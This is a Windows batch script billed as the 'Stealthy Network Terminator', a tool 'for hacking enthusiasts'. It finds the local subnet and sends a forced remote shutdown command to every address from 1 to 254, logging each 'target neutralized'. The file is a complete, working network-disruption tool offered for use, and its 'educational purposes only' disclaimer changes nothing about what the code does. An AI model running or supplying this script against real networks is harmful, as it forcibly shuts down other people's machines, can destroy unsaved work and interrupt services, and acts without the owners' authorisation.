@echo off
setlocal enabledelayedexpansion

REM Stealthy Network Terminator - Developed by FLUFFY

REM This script is for educational purposes only. Misuse for malicious intent is illegal.

REM FLUFFY presents the Stealthy Network Terminator (SNT), a potent tool for hacking enthusiasts.
REM It silently infiltrates your local network, wreaking havoc with a single click.

REM WARNING: Use this tool responsibly and only on networks you own or have explicit permission to test.

REM Get ready to unleash chaos! Initiating SNT...

REM Log file setup
set "logfile=%~dp0SNT_log.txt"
echo SNT Execution Log - %date% %time% > "%logfile%"
echo ======================================== >> "%logfile%"

REM Get local IP address
for /f "tokens=2 delims=:" %%i in ('ipconfig ^| findstr /i "IPv4"') do (
    set "local_ip=%%i"
)
set "local_ip=%local_ip: =%" REM Remove spaces

if "%local_ip%"=="" (
    echo Failed to retrieve local IP address. Aborting operation. >> "%logfile%"
    echo Failed to retrieve local IP address. Aborting operation.
    exit /b 1
)

echo Local IP Address: %local_ip% >> "%logfile%"

REM Extract network range
for /f "tokens=1,2,3 delims=." %%a in ("%local_ip%") do (
    set "network_range=%%a.%%b.%%c."
)

if "%network_range%"=="" (
    echo Failed to extract network range. Aborting operation. >> "%logfile%"
    echo Failed to extract network range. Aborting operation.
    exit /b 1
)

echo Network Range: %network_range%0 >> "%logfile%"

REM Initiating shutdown sequence for all devices in the network range
echo Stealth mode activated... Engaging the SNT... >> "%logfile%"
echo Stealth mode activated... Engaging the SNT...
set "error_count=0"
set "success_count=0"

for /L %%i in (1,1,254) do (
    set "ip=%network_range%%%i"
    shutdown /s /f /t 0 /m \\!ip! >nul 2>&1
    if errorlevel 1 (
        echo Failed to send shutdown command to !ip!... Evading detection. >> "%logfile%"
        set /a "error_count+=1"
    ) else (
        echo Shutdown command sent to !ip!... Target neutralized. >> "%logfile%"
        set /a "success_count+=1"
    )
)

REM Display summary
echo. >> "%logfile%"
echo Summary: >> "%logfile%"
echo ===================== >> "%logfile%"

if %error_count% gtr 0 (
    echo %error_count% devices failed to shut down... Potential resistance detected. >> "%logfile%"
    echo %error_count% devices failed to shut down... Potential resistance detected.
) else (
    echo All devices in the network range have received shutdown command... Network domination achieved! >> "%logfile%"
    echo All devices in the network range have received shutdown command... Network domination achieved!
)

echo %success_count% devices were successfully shut down. >> "%logfile%"
echo Terminating SNT... Exit stealth mode and return to the shadows. >> "%logfile%"
echo Terminating SNT... Exit stealth mode and return to the shadows.

pause
